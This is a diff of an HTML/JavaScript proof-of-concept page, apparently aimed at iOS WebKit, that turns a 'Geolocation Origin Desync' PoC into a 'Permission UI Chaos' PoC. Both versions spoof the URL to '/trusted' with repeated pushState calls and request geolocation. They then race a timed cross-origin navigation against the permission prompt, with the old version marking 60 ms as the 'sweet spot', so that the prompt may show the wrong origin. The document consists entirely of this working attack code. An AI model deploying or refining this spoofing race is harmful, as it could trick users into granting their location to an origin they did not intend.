@@ -2,91 +2,81 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>iOS WebKit Geolocation Origin Desync PoC</title>
+<title>iOS Permission UI Chaos PoC</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
 <style>
 body {
-  margin:0;
   font-family:-apple-system,BlinkMacSystemFont,system-ui;
-  background:#f5f5f7;
-}
-#panel {
-  display:none;
-  max-width:480px;
-  margin:70px auto;
-  background:#fff;
-  padding:24px;
-  border-radius:16px;
-  box-shadow:0 20px 60px rgba(0,0,0,.25);
+  background:#000;
+  color:#0f0;
   text-align:center;
+  margin:0;
 }
 button {
-  padding:12px 18px;
-  font-size:15px;
+  margin-top:40px;
+  padding:14px 20px;
+  font-size:16px;
   border:none;
-  border-radius:10px;
-  background:#007aff;
+  border-radius:12px;
+  background:#ff0033;
   color:#fff;
 }
-#log {
-  margin-top:14px;
-  font-size:13px;
-  color:#333;
-}
-.small {
-  font-size:12px;
-  color:#666;
+pre {
+  margin:20px;
+  font-size:11px;
+  text-align:left;
+  white-space:pre-wrap;
 }
 </style>
 </head>
 
 <body>
 
-<div style="text-align:center;margin-top:40px">
-  <button id="trigger">Start PoC</button>
-</div>
-
-<div id="panel">
-  <h3>Secure Area</h3>
-  <p class="small">Trusted path required</p>
-  <div id="log">Status: idle</div>
-</div>
+<h3>⚠️ Permission UI Chaos Test</h3>
+<button id="go">START SATAN POC</button>
+<pre id="log"></pre>
 
 <script>
 const log = m =>
-  document.getElementById('log').textContent = "Status: " + m;
+  document.getElementById('log').textContent += m + "\n";
 
-let geoRequested = false;
+let started = false;
 
-/* 1️⃣ USER GESTURE */
-document.getElementById('trigger').onclick = () => {
-  /* Fake trusted URL */
-  history.pushState({}, '', '/trusted');
+document.getElementById('go').onclick = () => {
+  if (started) return;
+  started = true;
 
-  document.getElementById('panel').style.display = 'block';
+  log("[*] pushState spam");
+  for (let i=0;i<5;i++) {
+    history.pushState({}, '', '/trusted'+i);
+  }
 
-  log("Requesting geolocation…");
-
-  /* 2️⃣ GEOLOCATION REQUEST */
+  log("[*] request geolocation");
   navigator.geolocation.getCurrentPosition(
-    () => log("Geolocation SUCCESS"),
-    () => log("Geolocation DENIED")
+    ()=>log("[+] geo success"),
+    ()=>log("[-] geo denied")
   );
 
-  geoRequested = true;
+  log("[*] lifecycle churn");
+  document.body.style.display='none';
+  setTimeout(()=>document.body.style.display='',10);
+
+  log("[*] visibility churn");
+  document.addEventListener('visibilitychange',()=>{});
+
+  log("[*] navigation chaos armed");
 };
 
-/* 3️⃣ NAVIGATION RACE — SAME PATTERN AS YOUR ORIGINAL PoC */
 window.addEventListener('pageshow', () => {
-  if (!geoRequested) return;
+  if (!started) return;
 
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        log("Navigating cross‑origin…");
-        location.href = 'https://google.com:9090';
-      }, 60); // 🔑 sweet spot (50–80ms)
+  requestAnimationFrame(()=>{
+    requestAnimationFrame(()=>{
+      setTimeout(()=>{
+        log("[!] cross-origin nav");
+        location.href = "https://google.com:9090";
+      }, 55);
     });
   });
 });
